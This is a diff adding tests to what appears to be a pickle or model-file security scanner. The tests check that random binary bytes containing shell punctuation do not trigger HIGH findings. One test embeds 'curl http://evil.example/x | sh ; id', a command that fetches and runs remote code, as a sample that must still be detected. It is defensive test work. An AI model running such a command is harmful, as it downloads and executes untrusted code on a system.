@@ -1119,3 +1119,32 @@ class TestDottedGlobalNameLaundering:
         assert not [f for f in findings if f.rule_id == "MFV-PICKLE-001"], (
             f"benign nested class was denied: {[f.rule_id for f in findings]}"
         )
+
+
+class TestBinaryBytesAreNotCommands:
+    """A protocol-2 pickle spells a bytes literal as `_codecs.encode(text,
+    'latin1')`. The text is binary decoded as latin-1, and random bytes contain
+    the characters the command-shape check looks for (a backtick, `;` next to a
+    space) often enough to fail the build on ordinary checkpoints. Found by
+    scanning real Hub files: resnet and zipformer checkpoints came out HIGH."""
+
+    @staticmethod
+    def _high(findings):
+        return [f for f in findings if f.severity in (Severity.HIGH, Severity.CRITICAL)]
+
+    def test_binary_bytes_with_a_backtick_do_not_flag(self, tmp_path):
+        raw = bytes([0x60, 0x04, 0xBF, 0x83, 0x30, 0xB6, 0x4C, 0x40])
+        findings = _scan(tmp_path, "blob.pkl", pickle.dumps(raw, protocol=2))
+        assert not self._high(findings), [(f.rule_id, f.severity) for f in findings]
+
+    def test_binary_bytes_with_shell_punctuation_do_not_flag(self, tmp_path):
+        raw = b"\x00\x01 ; \x02 | \x03 & \x04 $( \x05"
+        findings = _scan(tmp_path, "blob2.pkl", pickle.dumps({"rng_state": raw}, protocol=2))
+        assert not self._high(findings), [(f.rule_id, f.severity) for f in findings]
+
+    def test_printable_shell_text_in_bytes_still_flags(self, tmp_path):
+        # The printable-ASCII gate is the whole point: readable command text
+        # hidden in a bytes literal is still reported.
+        raw = b"curl http://evil.example/x | sh ; id"
+        findings = _scan(tmp_path, "cmd.pkl", pickle.dumps(raw, protocol=2))
+        assert self._high(findings), [(f.rule_id, f.severity) for f in findings]
